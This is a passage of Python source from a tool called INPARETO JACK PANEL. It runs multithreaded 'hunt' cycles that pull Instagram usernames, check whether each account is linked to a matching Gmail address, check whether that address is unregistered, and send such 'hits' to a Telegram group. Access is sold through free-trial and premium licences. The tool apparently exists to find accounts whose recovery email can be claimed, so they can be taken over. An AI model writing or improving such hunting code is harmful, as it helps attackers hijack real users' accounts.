        _hit_report_executor.submit(_write_hit_session_basic, username, dict(info or {}))
    except Exception as exc:
        log_event("HIT FILE", f"@{username} session save {str(exc)[:60]}")

    def _profile_side_effects():
        try:
            profile_record_hit()
            maybe_send_milestone_alert()
        except Exception as exc:
            log_event("HIT STATS", str(exc)[:80])

    try:
        _hit_upgrade_executor.submit(_profile_side_effects)
    except Exception as exc:
        log_event("HIT STATS", str(exc)[:80])


def log_event(event_type, message):
    if not _operator_log_event_visible(event_type):
        return
    timestamp = datetime.now(timezone.utc).strftime("%H:%M:%S")
    entry = f"[{timestamp}] {event_type}: {message}"
    with event_log_lock:
        event_log.append(entry)
        if len(event_log) > MAX_EVENTS:
            event_log.pop(0)
    if event_type == "HIT FAIL":
        pass
    elif (
        "FAIL" in event_type
        or event_type in ("TG ERR", "ERROR", "CLOUD", "PFP FETCH")
    ):
        append_error_log(event_type, message)


def _panel_enter_alt_screen():
    """Dedicated TUI buffer — no scrollback ghost lines above the panel."""
    global _panel_alt_screen
    if _panel_alt_screen:
        return
    sys.stdout.write("\033[?1049h\033[2J\033[H\033[?25l")
    sys.stdout.flush()
    _panel_alt_screen = True


def _panel_leave_alt_screen():
    global _panel_alt_screen, _panel_live_drawn_once
    if not _panel_alt_screen:
        return
    sys.stdout.write("\033[?25h\033[?1049l")
    sys.stdout.flush()
    _panel_alt_screen = False
    _panel_live_drawn_once = False


def clear_console():
    if _panel_alt_screen:
        sys.stdout.write("\033[2J\033[H")
        sys.stdout.flush()
        return
    if os.name == "nt":
        os.system("cls")
    else:
        sys.stdout.write("\033[2J\033[H")
        sys.stdout.flush()


def format_duration(seconds):
    seconds = int(seconds)
    hrs, rem = divmod(seconds, 3600)
    mins, secs = divmod(rem, 60)
    return f"{hrs:02d}:{mins:02d}:{secs:02d}"


def make_bar(current, total, width=30, char="▰"):
    if total == 0:
        return "─" * width
    filled = int((current / total) * width)
    return (char * filled) + ("─" * (width - filled))


def _build_dashboard_frame(
    uptime,
    generated,
    valid_count,
    hits_count,
    error_count,
    events,
    *,
    show_logo,
):
    """Build full panel off-screen — never clear terminal until frame is ready."""
    success_pct = (valid_count / generated * 100) if generated else 0
    hit_pct = (hits_count / generated * 100) if generated else 0
    valid_pct = (hits_count / valid_count * 100) if valid_count else 0

    if JACK_PANEL_LIVE:
        live_snap = _hunt_health_snapshot(live=True)
        status_text = live_snap["status_text"]
        status_color = live_snap["status_color"]
    else:
        live_snap = None
        block = hunt_block_reason()
        if block:
            status_text = block[:22].upper()
            status_color = ANSI_YELLOW if "API" not in block else ANSI_RED
        elif _api_auto_paused and not _user_manual_paused and not _hunt_recently_ok():
            status_text = "API OFF"
            status_color = ANSI_RED
        elif paused:
            status_text = "PAUSED"
            status_color = ANSI_YELLOW
        else:
            status_text = "RUNNING"
            status_color = ANSI_GREEN

    frame = [""]
    if show_logo:
        frame.extend(paint_logo_lines(JOINT_BADGE))
        frame.append("")
    else:
        frame.append(gradient_line("  ◆ INPARETO · JACK PANEL · LIVE ◆ ", (0, 200, 255), (200, 80, 255)))
        frame.append("")

    session_rows = build_session_rows(uptime, status_text, status_color)
    mid = (len(session_rows) + 1) // 2
    frame.extend(_cards_side_by_side_lines(session_rows[:mid], session_rows[mid:]))
    frame.extend(_cards_side_by_side_lines(
        build_core_rows(generated, valid_count, hits_count, error_count, bar_w=10),
        build_performance_rows(success_pct, hit_pct, valid_pct, bar_w=10, generated=generated),
    ))

    cycle_tag = "1×HTTP" if HUNT_USE_CYCLE else "3×HTTP"
    profile_tag = "tx" if _IS_TERMUX else "pc"
    config_val = (
        f"{THREAD_COUNT}t·{profile_tag} · {cycle_tag} · {_min_followers_display()} · "
        f"TG{'ON' if TELEGRAM_ENABLED else 'OFF'}"
    )
    frame.extend(_cards_side_by_side_lines(
        [("Runtime", config_val[:19], ANSI_YELLOW)],
        build_probe_rows(),
    ))

    if events:
        frame.extend(_event_log_card_lines(events))

    footer_fn = _paint_dashboard_footer_live if JACK_PANEL_LIVE else paint_dashboard_footer
    frame.extend(footer_fn())
    tick = datetime.now(timezone.utc).strftime("%H:%M:%S")
    if JACK_PANEL_LIVE:
        idle = max(0.0, time.monotonic() - _last_gen_at)
        hunt_note = ""
        if live_snap and pause_event.is_set() and _workers_started:
            lbl = (live_snap.get("hunt_lbl") or "").strip()
            if lbl and not lbl.startswith("active"):
                hunt_note = f" · {lbl}"
        elif idle > 6:
            hunt_note = f" · gen idle {idle:.0f}s"
        hint = f"\n  ↻ live · {tick}{hunt_note}  ·  Ctrl+C → menu · l=logout\n"
    else:
        hint = "\n  Snapshot — Enter for menu · l=logout · q=quit\n"
    frame.append(apply_color(hint, ANSI_DIM))
    return frame, show_logo


def _snapshot_dashboard_stats():
    """Live counters — never block panel paint on hunt worker lock."""
    global _last_dashboard_stats
    snap = None
    if lock.acquire(timeout=0.08):
        try:
            snap = {
                "gen": gen,
                "valid": valid,
                "hit": hit,
                "errors": errors,
                "at": time.time(),
            }
        finally:
            lock.release()
    if snap is None:
        snap = {
            "gen": int(_last_dashboard_stats.get("gen") or 0),
            "valid": int(_last_dashboard_stats.get("valid") or 0),
            "hit": int(_last_dashboard_stats.get("hit") or 0),
            "errors": int(_last_dashboard_stats.get("errors") or 0),
            "at": time.time(),
        }
    if event_log_lock.acquire(timeout=0.05):
        try:
            events = list(event_log)
            snap["events"] = events
            _last_dashboard_stats = dict(snap)
            _last_dashboard_stats["events"] = events
        finally:
            event_log_lock.release()
    else:
        snap["events"] = list(_last_dashboard_stats.get("events") or [])
    return snap


def _emit_panel_text(frame_lines, *, full_clear=False):
    """Write panel frame — live mode full-clears each tick to kill ghost lines."""
    global _panel_live_drawn_once, _panel_last_frame_lines
    if _panel_alt_screen:
        sys.stdout.write("\033[2J\033[H")
        _panel_live_drawn_once = True
        for line in frame_lines:
            sys.stdout.write(line)
            sys.stdout.write("\033[K\n")
        sys.stdout.write("\033[J")
        _panel_last_frame_lines = len(frame_lines)
    else:
        clear_console()
        sys.stdout.write("\n".join(frame_lines) + "\n")
    sys.stdout.flush()


def draw_dashboard(*, blocking=True, lock_timeout=1.5):
    global DASHBOARD_SHOW_LOGO, _panel_last_draw_at
    if blocking:
        acquired = _panel_paint_lock.acquire(blocking=True, timeout=lock_timeout)
    else:
        acquired = _panel_paint_lock.acquire(blocking=False)
    if not acquired:
        return False
    try:
        _draw_dashboard_impl()
        _panel_last_draw_at = time.time()
        return True
    finally:
        _panel_paint_lock.release()


def _draw_dashboard_impl():
    global DASHBOARD_SHOW_LOGO
    uptime = format_duration((datetime.now(timezone.utc) - START_TIME).total_seconds())
    snap = _snapshot_dashboard_stats()
    generated = int(snap.get("gen") or 0)
    valid_count = int(snap.get("valid") or 0)
    hits_count = int(snap.get("hit") or 0)
    error_count = int(snap.get("errors") or 0)
    events = snap.get("events") or []

    show_logo = DASHBOARD_SHOW_LOGO
    try:
        frame, show_logo = _build_dashboard_frame(
            uptime, generated, valid_count, hits_count, error_count, events,
            show_logo=show_logo,
        )
    except Exception as exc:
        frame = [
            gradient_line("  ◆ INPARETO · JACK PANEL · LIVE ◆ ", (0, 200, 255), (200, 80, 255)),
            "",
            apply_color(f"  Panel build: {str(exc)[:72]}", ANSI_RED),
            apply_color("\n  ↻ live dashboard  ·  Ctrl+C → menu · l=logout\n", ANSI_DIM),
        ]

    try:
        text = "\n".join(frame) + "\n"
        _emit_panel_text(frame, full_clear=show_logo and DASHBOARD_SHOW_LOGO)
        if show_logo and DASHBOARD_SHOW_LOGO:
            DASHBOARD_SHOW_LOGO = False
    except Exception as exc:
        try:
            sys.stdout.write(
                gradient_line("  ◆ INPARETO · JACK PANEL · LIVE ◆ ", (0, 200, 255), (200, 80, 255))
                + "\n"
                + apply_color(f"  Panel print: {str(exc)[:72]}", ANSI_RED)
                + "\n"
            )
            sys.stdout.flush()
        except Exception:
            pass


def _ensure_panel_refresh_thread():
    """Restart background painter if it died mid-session."""
    global _panel_refresh_thread
    if _panel_refresh_thread is not None and _panel_refresh_thread.is_alive():
        return
    _panel_refresh_stop.clear()
    _panel_refresh_thread = threading.Thread(
        target=_panel_refresh_loop,
        daemon=True,
        name="panel-refresh",
    )
    _panel_refresh_thread.start()


def _panel_refresh_loop():
    """Single background painter — fixed 2s tick, always redraws."""
    while True:
        if _panel_refresh_stop.is_set():
            break
        interval = DASHBOARD_LIVE_INTERVAL if JACK_PANEL_LIVE else max(DASHBOARD_INTERVAL, 2.0)
        t0 = time.monotonic()
        try:
            if JACK_PANEL_LIVE:
                threading.Thread(
                    target=_refresh_hunt_gateway_meta,
                    daemon=True,
                    name="panel-meta",
                ).start()
            draw_dashboard(blocking=True, lock_timeout=min(1.8, interval - 0.1))
        except Exception as exc:
            try:
                log_event("PANEL", str(exc)[:80])
            except Exception:
                pass
        elapsed = time.monotonic() - t0
        wait = max(0.05, interval - elapsed)
        if _panel_refresh_stop.wait(wait):
            break


_gmail_miss_logged = 0
_ig_invalid_logged = 0


def _log_ig_invalid_sample(username: str, data: dict) -> None:
    """Sample why hunt_cycle returns valid=false — stops after 8 lines."""
    global _ig_invalid_logged
    if _ig_invalid_logged >= 8:
        return
    _ig_invalid_logged += 1
    ig = str(data.get("ig_response") or data.get("error") or "unknown")[:80]
    buf = data.get("buffer_depth", "?")
    log_event("IG-LOOKUP", f"@{username} invalid — {ig} · buf {buf}")


def _log_gmail_miss(username: str, response: str) -> None:
    """Surface valid IG + gmail fail — common on Termux when token/IP breaks."""
    global _gmail_miss_logged
    if _gmail_miss_logged >= 5:
        return
    _gmail_miss_logged += 1
    msg = (response or "unknown")[:100]
    if "gmail_error" in msg or "parse" in msg.lower() or "token" in msg.lower():
        log_event("GMAIL", f"@{username} valid but lookup broken — {msg}")
    elif _gmail_miss_logged == 1:
        log_event("GMAIL", f"@{username} valid · gmail taken ({msg})")


def _hunt_tool_timeout():
    """Telegram /gen and tools — match hunt read timeouts on Termux."""
    if _IS_TERMUX:
        return (HUNT_CONNECT_TIMEOUT, HUNT_IG_GEN_READ_TIMEOUT)
    return (HUNT_CONNECT_TIMEOUT, API_TOOL_TIMEOUT)


def _hunt_reserve_quota():
    """Reserve free-tier quota before gateway work (rollback if ig_gen empty)."""
    if not TELEGRAM_ENABLED:
        return True
    ok, reason, _ = plan_acquire_generation()
    if not ok:
        if reason == "daily_limit":
            plan_handle_daily_limit_hit()
            apply_worker_pause_state()
        elif reason in ("trial_expired", "expired", "no_access"):
            apply_worker_pause_state()
        elif reason == "cloud_offline":
            uid = resolve_operator_telegram_id()
            if uid and (_dashboard_local_premium_snap(uid) or admin_is_admin(uid)):
                log_event("PLAN", "quota cloud offline — premium hunt continues")
                return True
            log_event("PLAN", "quota cloud offline — retrying next cycle")
        else:
            log_event("PLAN", f"quota skip: {reason or 'unknown'}")
    return ok


def _hunt_release_quota():
    if not TELEGRAM_ENABLED:
        return
    plan_release_generation()


def _hunt_should_stop():
    if (
        is_locally_logged_out()
        or _api_auto_paused
        or _user_manual_paused
        or not pause_event.is_set()
    ):
        return True
    uid = resolve_operator_telegram_id()
    if TELEGRAM_ENABLED and uid and operator_ban_active(uid, force=False):
        return True
    if (
        TELEGRAM_ENABLED
        and ACCESS_BLOCKED
        and not operator_access_sticky_active()
        and not (JACK_PANEL_LIVE and _operator_hunt_trusted())
    ):
        return True
    if not _worker_api_ok():
        if _local_gateway_mode() and pause_event.is_set():
            return False
        return True
    return False


def _run_hunt_cycle_fast(api_base):
    """One gateway call: gen + IG + Gmail (endpoint.py hunt_cycle)."""
    global gen, valid, hit
    if not _hunt_reserve_quota():
        return
    quota_pending = True
    url = f"{api_base}/hunt_cycle?min={MIN_FOLLOWERS}"
    try:
        with _hunt_gateway_sem:
            response = _api_hunt_get_retry(
                url,
                timeout=_hunt_cycle_request_timeout(),
                hold_slot=True,
                attempts=1,
            )
        response.raise_for_status()
        data = response.json()
        _mark_api_alive_from_hunt_success()
        if not data.get("gen_ok"):
            _hunt_release_quota()
            return
        username = str(data.get("username") or "").strip()
        if not username:
            _hunt_release_quota()
            return
        quota_pending = False
    except Exception:
        if quota_pending:
            _hunt_release_quota()
        raise
    info = data.get("info") or {}
    is_valid = bool(data.get("valid"))
    if "buffer_depth" in data or "ig_block_sec" in data:
        buf_raw = data.get("buffer_depth", _hunt_gateway_meta.get("buffer"))
        if isinstance(buf_raw, dict):
            try:
                buf_val = max(int(v or 0) for v in buf_raw.values())
            except (TypeError, ValueError):
                buf_val = _hunt_gateway_meta.get("buffer")
        else:
            try:
                buf_val = int(buf_raw) if buf_raw is not None else None
            except (TypeError, ValueError):
                buf_val = _hunt_gateway_meta.get("buffer")
        _hunt_gateway_meta.update({
            "buffer": buf_val,
            "ig_block": float(data.get("ig_block_sec") or 0.0),
            "updated": time.time(),
        })
    with lock:
        gen += 1
        if is_valid:
            valid += 1
    _note_gen_success()
    if not is_valid:
        _log_ig_invalid_sample(username, data)
    _note_hunt_ig_lookup_result(str(data.get("ig_response") or data.get("error") or ""))
    if data.get("valid") and not data.get("hit"):
        _log_gmail_miss(username, str(data.get("gmail_response") or ""))
    if data.get("hit") and data.get("valid"):
        submit_hit_report(username, info)


def _run_hunt_cycle_legacy(api_base):
    """Legacy: 3 gateway calls — semaphore per hop, quota before ig_gen."""
    global gen, valid, hit, errors
    if not _hunt_reserve_quota():
        return
    quota_pending = True
    gen_timeout = _hunt_ig_gen_timeout()
    lookup_timeout = _hunt_lookup_timeout()
    try:
        with _hunt_gateway_sem:
            response1 = _api_hunt_get_retry(
                f"{api_base}/ig_gen?min={MIN_FOLLOWERS}",
                timeout=gen_timeout,
                hold_slot=True,
            )
            response1.raise_for_status()
            data = response1.json()
            username = str(data.get("username") or "").strip()
            if not username:
                _hunt_release_quota()
                return
            quota_pending = False
    except Exception:
        if quota_pending:
            _hunt_release_quota()
        raise
    info = data.get("info", {})
    with lock:
        gen += 1
    _note_gen_success()
    if len(username) < 6:
        return
    if _hunt_should_stop():
        return
    email = username + "@gmail.com"
    try:
        with _hunt_gateway_sem:
            response2 = _api_hunt_get_retry(
                f"{api_base}{HUNT_IG_LOOKUP_ROUTE}?email={quote(email)}",
                timeout=lookup_timeout,
                hold_slot=True,
            )
            response2.raise_for_status()
            ig_body = response2.json()
            if ig_body.get("status") is not True:
                _note_hunt_ig_lookup_result(str(ig_body.get("response") or ""))
                return
            _note_hunt_ig_lookup_result(str(ig_body.get("response") or "ok"))
            if _hunt_should_stop():
                return
            response3 = _api_hunt_get(
                f"{api_base}/gmail_lookup?email={quote(email)}",
                timeout=lookup_timeout,
                hold_slot=True,
            )
            if response3.status_code >= 500:
                with lock:
                    errors += 1
                log_event("GMAIL", f"lookup HTTP {response3.status_code} — restart endpoint.py")
                return
            response3.raise_for_status()
            gmail_body = response3.json()
    except (requests.RequestException, ValueError) as exc:
        with lock:
            errors += 1
        log_event("GMAIL", f"@{username} lookup failed — {str(exc)[:80]}")
        return
    with lock:
        valid += 1
    if gmail_body.get("status") is True:
        submit_hit_report(username, info)
    else:
        _log_gmail_miss(username, str(gmail_body.get("response") or ""))


def run():
    global gen, valid, hit, errors, _hunt_inflight

    if (
        TELEGRAM_ENABLED
        and ACCESS_BLOCKED
        and not operator_access_sticky_active()
        and not (JACK_PANEL_LIVE and _operator_hunt_trusted())
    ):
        return

    if not _worker_api_ok():
        return

    api_base = get_api_base_url()

    with _hunt_inflight_lock:
        _hunt_inflight += 1
    try:
        if HUNT_USE_CYCLE:
            _run_hunt_cycle_fast(api_base)
        else:
            _run_hunt_cycle_legacy(api_base)

    except requests.exceptions.RequestException as e:
        _mark_api_dead_from_hunt(e)
        if _hunt_transient_error(e):
            _hunt_register_transient_fail()
            return
        with lock:
            errors += 1
        if not _api_auto_paused:
            tag = "TIMEOUT" if isinstance(e, requests.exceptions.Timeout) else "ERROR"
            log_event(tag, str(e)[:80])
    except Exception as e:
        if _hunt_transient_error(e):
            _hunt_register_transient_fail()
            return
        with lock:
            errors += 1
        log_event("ERROR", str(e)[:100])
    finally:
        with _hunt_inflight_lock:
            _hunt_inflight = max(0, _hunt_inflight - 1)


def worker(worker_id=0):
    """Each thread runs one hunt cycle (prefer single /hunt_cycle HTTP hop)."""
    while True:
        if is_locally_logged_out():
            pause_event.clear()
            pause_event.wait(timeout=API_WORKER_IDLE_SEC)
            continue
        if _api_auto_paused or _user_manual_paused:
            if _user_manual_paused and not _api_auto_paused and _worker_api_ok():
                idle = API_WORKER_IDLE_SEC
            else:
                idle = API_WORKER_RECOVERY_IDLE
            pause_event.wait(timeout=idle)
            continue
        if not _worker_api_ok() and not _local_gateway_mode():
            pause_event.wait(timeout=API_WORKER_RECOVERY_IDLE)
            continue
        if not pause_event.is_set():
            pause_event.wait(timeout=0.5)
            continue
        uid = resolve_operator_telegram_id()
        if TELEGRAM_ENABLED and uid and operator_ban_active(uid, force=False):
            pause_event.clear()
            pause_event.wait(timeout=ACCESS_SYNC_INTERVAL_SEC)
            continue
        if TELEGRAM_ENABLED and ACCESS_BLOCKED and not _operator_hunt_trusted():
            global _worker_last_access_sync
            now_sync = time.time()
            if now_sync - _worker_last_access_sync >= ACCESS_SYNC_INTERVAL_SEC:
                _worker_last_access_sync = now_sync
                sync_operator_access()
            if ACCESS_BLOCKED and not _operator_hunt_trusted():
                pause_event.wait(timeout=0.15)
            continue
        if worker_id >= THREAD_COUNT:
            pause_event.wait(timeout=API_WORKER_IDLE_SEC)
            continue
        if not _worker_api_ok():
            pause_event.wait(timeout=API_WORKER_RECOVERY_IDLE)
            continue
        if _hunt_in_network_blip():
            pause_event.wait(timeout=0.15)
            continue
        if _hunt_in_ip_change_pause():
            pause_event.wait(timeout=0.5)
            continue
        _hunt_worker_backoff_before_cycle()
        run()


def operator_session_ready(*, refresh=False):
    """Fully verified for hunting + terminal control panel (Telegram id based)."""
    if is_locally_logged_out():
        return False
    if not TELEGRAM_ENABLED:
        return True
    if refresh:
        reconcile_operator_hit_group()
        sync_operator_access()
    return operator_access_ok(force=refresh)


def operator_session_ready_bounded(*, refresh=False, timeout=VERIFY_UI_TIMEOUT):
    if not refresh:
        if operator_session_ready(refresh=False):
            return True
        return operator_terminal_ready_local()
    reconcile_operator_hit_group()
    try:
        with ThreadPoolExecutor(max_workers=1) as pool:
            if pool.submit(operator_session_ready, refresh=True).result(timeout=timeout):
                return True
    except FuturesTimeoutError:
        log_event("ACCESS", "verification refresh timed out")
    return operator_terminal_ready_local()


def operator_terminal_ready_local(*, fast=False):
    """Terminal menu — plan + hit group. fast=True: skip slow cloud round-trips."""
    if is_locally_logged_out():
        return False
    if not TELEGRAM_ENABLED:
        return True
    user_id = resolve_operator_telegram_id()
    if not user_id:
        return False
    admin_load_settings(force=False)
    if admin_is_admin(user_id):
        return bool(read_local_hit_group_id() or get_operator_hit_group_id())
    if fast:
        entitled, _, info = operator_plan_entitled(user_id)
        if not entitled:
            return False
        if isinstance(info, dict) and info.get("plan") == PLAN_FREE:
            used = int(info.get("day_count") or 0)
            limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
            if used >= limit:
                return False
        return bool(read_local_hit_group_id() or get_operator_hit_group_id())
    refresh_terminal_license_from_cloud()
    entitled, _, info = operator_plan_entitled(user_id)
    if not entitled:
        return False
    if isinstance(info, dict) and info.get("plan") == PLAN_FREE:
        ok, reason, _ = plan_can_hunt(user_id)
        if not ok and reason == "daily_limit":
            return False
    sync_local_hit_group_from_cloud()
    return bool(read_local_hit_group_id() or get_operator_hit_group_id())


def terminal_verification_complete(*, refresh=False):
    """True when setup is complete. refresh=True pulls cloud state first."""
    if not TELEGRAM_ENABLED:
        return True
    user_id = resolve_operator_telegram_id()
    if refresh:
        ensure_boot_access_context()
    else:
        admin_load_settings(force=False)
    if operator_terminal_ready_local(fast=True):
        mark_operator_access_verified()
        if refresh:
            _spawn_access_cache_refresh()
        return True
    if refresh:
        reconcile_operator_hit_group()
        sync_local_hit_group_from_cloud()
        if operator_terminal_ready_local(fast=True):
            mark_operator_access_verified()
            _spawn_access_cache_refresh()
            return True
    admin_load_settings(force=False)
    if admin_is_admin(user_id):
        if operator_terminal_ready_local(fast=True):
            mark_operator_access_verified()
            return True
        return False
    if not operator_terminal_ready_local(fast=True):
        return False
    return operator_session_ready_bounded(refresh=True)


def _spawn_access_cache_refresh():
    def _run():
        try:
            reconcile_operator_hit_group()
            sync_operator_access()
            operator_access_ok(force=True)
        except Exception as exc:
            log_event("ACCESS REFRESH", str(exc)[:80])

    threading.Thread(target=_run, daemon=True, name="access-refresh").start()


def _spawn_hit_group_warmup():
    def _run():
        try:
            reconcile_operator_hit_group()
            sync_local_hit_group_from_cloud()
        except Exception as exc:
            log_event("HG WARM", str(exc)[:80])

    threading.Thread(target=_run, daemon=True, name="hg-warm").start()


def build_terminal_verification_rows():
    """Status checklist while waiting for full access."""
    user_id = resolve_operator_telegram_id()
    if not user_id:
        return [_terminal_verify_line("Telegram", "Link your bot first (restart joint.py)", ANSI_YELLOW)]
    rows = []
    entitled, plan_reason, info = operator_plan_entitled(user_id)
    if not entitled:
        if plan_reason == "trial_expired":
            rows.append(_terminal_verify_line(
                "Plan", f"Free trial ended ({FREE_TRIAL_DAYS} days)", ANSI_RED,
            ))
        elif plan_reason == "expired":
            exp = info.get("expires_at") if isinstance(info, dict) else None
            rows.append(_terminal_verify_line(
                "Premium", f"Expired · {license_format_expiry(exp)}", ANSI_RED,
            ))
        else:
            rows.append(_terminal_verify_line("Plan", "Inactive — /plan or /redeem in bot", ANSI_RED))
        rows.append(_terminal_verify_line("Tip", "Admin: /grant YOUR_ID 30", ANSI_DIM))
        return rows
    if isinstance(info, dict) and info.get("plan") == PLAN_FREE:
        used = int(info.get("day_count") or 0)
        limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
        days_left = int(info.get("days_left") or 0)
        if used >= limit:
            rows.append(_terminal_verify_line(
                "Plan", f"Free limit {used:,}/{limit:,} today", ANSI_RED,
            ))
            rows.append(_terminal_verify_line("Fix", "Switch to Premium — /redeem", ANSI_DIM))
            return rows
        rows.append(_terminal_verify_line(
            "Plan", f"Free · {days_left}d left · {used:,}/{limit:,} today", ANSI_YELLOW,
        ))
    else:
        exp = info.get("expires_at") if isinstance(info, dict) else None
        rows.append(_terminal_verify_line(
            "Plan", f"Premium · until {license_format_expiry(exp)}", ANSI_GREEN,
        ))
    granted, state = admin_user_access_granted(user_id)
    if not granted:
        if state == "banned":
            return rows + [_terminal_verify_line("Access", "Suspended", ANSI_RED)]
        rows.append(_terminal_verify_line("Channels", "Join required — /verify in bot", ANSI_YELLOW))
        return rows
    rows.append(_terminal_verify_line("Channels", "OK", ANSI_GREEN))
    hg_ok, hg_reason = operator_hit_group_access_state(force=True)
    gid = get_operator_hit_group_id()
    if hg_ok:
        rows.append(_terminal_verify_line("Hit group", f"OK · {gid or 'linked'}", ANSI_GREEN))
    elif hg_reason == "not_admin":
        rows.append(_terminal_verify_line("Hit group", "Promote bot to admin", ANSI_YELLOW))
    else:
        rows.append(_terminal_verify_line("Hit group", "Link group — /verifyhitgroup", ANSI_YELLOW))
    return rows


def build_terminal_access_notice_rows_local():
    """Terminal checklist — local .inpareto_* + cloud license (Telegram id only)."""
    user_id = resolve_operator_telegram_id()
    if not user_id:
        return [_terminal_verify_line("Telegram", "Link bot first (restart joint.py)", ANSI_YELLOW)]

    admin_load_settings(force=False)

    if admin_is_admin(user_id):
        gid = read_local_hit_group_id() or get_operator_hit_group_id()
        if gid:
            return [_terminal_verify_line("Access", "Admin — press Enter to open menu", ANSI_GREEN)]
        return [
            _terminal_verify_line("Hit group", "Not linked — /verifyhitgroup in GROUP", ANSI_YELLOW),
            _terminal_verify_line(
                "Fix", "Add bot to group → promote admin → /verifyhitgroup", ANSI_DIM,
            ),
        ]

    entitled, plan_reason, info = operator_plan_entitled(user_id)
    if entitled:
        rows = []
        if isinstance(info, dict) and info.get("plan") == PLAN_FREE:
            used = int(info.get("day_count") or 0)
            limit = int(info.get("limit") or FREE_DAILY_GEN_LIMIT)
            days_left = int(info.get("days_left") or 0)
            if used >= limit:
                return [
                    _terminal_verify_line(
                        "Plan", f"Free daily limit {used:,}/{limit:,}", ANSI_RED,
                    ),
                    _terminal_verify_line("Fix", "Switch to INPARETO Premium — /redeem", ANSI_DIM),
                ]
            rows.append(_terminal_verify_line(
                "Plan",
                f"Free · {days_left}d trial · {used:,}/{limit:,} today",
                ANSI_YELLOW,
            ))
        elif isinstance(info, dict) and info.get("plan") == PLAN_PREMIUM:
            rows = [
                _terminal_verify_line(
                    "Plan",
                    f"Premium · until {license_format_expiry(info.get('expires_at'))}",
                    ANSI_GREEN,
                ),
            ]
        gid = read_local_hit_group_id() or get_operator_hit_group_id()
        if gid:
            rows.append(_terminal_verify_line("Hit group", f"Linked · {gid}", ANSI_GREEN))
            rows.append(_terminal_verify_line("Menu", "Press Enter to open control panel", ANSI_GREEN))
        else:
            rows.append(_terminal_verify_line("Hit group", "Required — /verifyhitgroup in GROUP", ANSI_YELLOW))
        return rows

    if plan_reason == "expired":
        exp = info.get("expires_at") if isinstance(info, dict) else None
        return [
            _terminal_verify_line(
                "Plan", f"Premium expired · {license_format_expiry(exp)}", ANSI_RED,
            ),
            _terminal_verify_line("Fix", "/redeem NEW-KEY in bot", ANSI_DIM),
        ]
    if plan_reason == "trial_expired":
        return [
            _terminal_verify_line("Plan", f"Free trial ended ({FREE_TRIAL_DAYS} days)", ANSI_RED),
            _terminal_verify_line("Fix", "/redeem INPA-… for Premium", ANSI_DIM),
        ]
    if plan_reason == "cloud_offline":
        return [
            _terminal_verify_line("Plan", "Cloud offline — retry Enter in a moment", ANSI_RED),
            _terminal_verify_line("Fix", "Check internet · /plan in bot", ANSI_DIM),
        ]
    return [
        _terminal_verify_line("Plan", "No active trial or Premium license", ANSI_RED),
        _terminal_verify_line("Fix", "/plan in bot · /redeem for Premium", ANSI_DIM),
    ]


def _fetch_terminal_verification_ui():
    pending = build_terminal_access_notice_rows()
    if pending:
        return _terminal_notice_title(pending), pending
    return "VERIFICATION REQUIRED", build_terminal_verification_rows()


def render_terminal_verification_screen(*, clear=False, refresh=False):
    if refresh:
        refresh_terminal_license_from_cloud()
        reconcile_operator_hit_group()
        sync_local_hit_group_from_cloud()
    if clear:
        clear_console()
    print()
    for line in paint_logo_lines(JOINT_BADGE):
        print(line)
    print()
    sys.stdout.flush()
    title = "VERIFICATION REQUIRED"
    body = build_terminal_access_notice_rows_local()
    if body and body[0][1] and "ready after Enter" in str(body[0][1]).lower():
        title = "VERIFICATION"
    for line in paint_action_box(title, body, ANSI_YELLOW):
        print(line)
    if TELEGRAM_ENABLED or has_local_operator_session() or _read_stored_chat_id():
        print(
            apply_color(
                "  Tip: l = log out this device from the prompt below.\n",
                ANSI_DIM,
            )
        )
    print()
    sys.stdout.flush()


def render_session_ready_menu():
    print()
    for line in paint_logo_lines(JOINT_BADGE):
        print(line)
    print()
    tg_line = "ON · remote bot active" if TELEGRAM_ENABLED else "OFF"
    with _health_lock:
        api_ok = bool(_health_cache.get("api"))
    rows = [
        ("Session", "background workers ON", ANSI_GREEN),
        ("Telegram", tg_line, ANSI_GREEN if TELEGRAM_ENABLED else ANSI_DIM),
        ("API", "ON" if api_ok else "OFF · run endpoint.py", ANSI_GREEN if api_ok else ANSI_RED),
        ("JACK panel", "use menu to start", ANSI_YELLOW),
    ]
    print_cards([rows])
    for line in paint_action_box(
        "READY",
        [
            ("Session has been started. Hunt runs in background.", ANSI_GREEN),
            ("Control the session using Remote Bot anytime from Telegram.", ANSI_CYAN),
        ],
        ANSI_CYAN,
    ):
        print(line)
    print()
    for line in paint_action_box(
        "MENU",
        [
            ("1  Open Live JACK panel (hunt runs in background)", ANSI_GREEN),
            ("2  View Session Status snapshot", ANSI_CYAN),
            ("l  Log out (clears this device)", ANSI_YELLOW),
            ("q  Leave menu (hunt keeps running)", ANSI_DIM),
        ],
        ANSI_MAGENTA,
    ):
        print(line)
    print()


def run_live_jack_panel():
    global DASHBOARD_SHOW_LOGO, JACK_PANEL_LIVE, _panel_refresh_thread, _panel_live_drawn_once
    DASHBOARD_SHOW_LOGO = True
    _panel_live_drawn_once = False
    JACK_PANEL_LIVE = True
    _panel_refresh_stop.clear()
    _panel_enter_alt_screen()
    apply_worker_pause_state()
    _ensure_panel_refresh_thread()
    try:
        draw_dashboard(blocking=True, lock_timeout=3.0)
    except Exception:
        pass
    try:
        while True:
            time.sleep(1.0)
            _ensure_panel_refresh_thread()
    except KeyboardInterrupt:
        JACK_PANEL_LIVE = False
        _panel_refresh_stop.set()
        _panel_leave_alt_screen()
        print(apply_color("\n  ▸ Panel stopped — workers + Telegram still running\n", ANSI_YELLOW))


def _headless_vps_mode():
    v = os.environ.get("INPARETO_HEADLESS", "").strip().lower()
    return v in ("1", "true", "yes", "vps")


def run_session_menu_loop():
    global _session_awaiting_verification
    _session_awaiting_verification = True
    _spawn_boot_access_refresh()
    _spawn_hit_group_warmup()
    first_pass = True
    need_refresh = False
    while True:
        render_terminal_verification_screen(clear=not first_pass, refresh=need_refresh)
        first_pass = False
        sys.stdout.flush()
        if terminal_verification_complete(refresh=need_refresh):
            break
        need_refresh = False
        print(
            apply_color(
                "\n  Finish setup in Telegram, then press Enter to refresh.\n"
                "  License: /redeem KEY  ·  Hit group: /verifyhitgroup in GROUP\n"
                "  Channels: /verify in bot DM if shown.\n"
                f"  {TERMINAL_WAIT_HINT}\n",
                ANSI_DIM,
            )
        )
        choice = premium_input("Waiting", TERMINAL_WAIT_HINT).lower()
        if choice in ("l", "logout", "out", "log out"):
            if terminal_execute_logout():
                _session_awaiting_verification = False
                return "logged_out"
            need_refresh = True
            continue
        if choice in ("q", "quit", "exit"):
            _session_awaiting_verification = False
